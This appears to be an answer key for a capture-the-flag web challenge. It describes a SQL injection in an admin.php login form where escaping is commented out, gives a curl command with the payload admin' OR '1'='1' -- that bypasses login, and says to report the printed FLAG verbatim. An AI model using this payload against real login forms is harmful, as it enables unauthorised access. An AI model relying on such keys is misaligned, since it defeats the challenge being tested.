# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Classic SQL injection in the `admin.php` login form. The
`username` POST parameter is concatenated raw into the auth query (escaping is
commented out), so an always-true `WHERE` clause logs you in and the page prints
the flag.

1. **Send a boolean SQLi auth bypass** in the `username` field:

   ```
   curl -s -X POST http://<target>/admin.php \
     --data-urlencode "username=admin' OR '1'='1' -- " \
     --data-urlencode "password=whatever"
   ```

   This makes the query `... WHERE username = 'admin' OR '1'='1' -- ' AND
   password = '...'`, which always matches.

2. **Extract the flag** (`FLAG{...}`) from the response (printed on successful
   login) and report it verbatim.
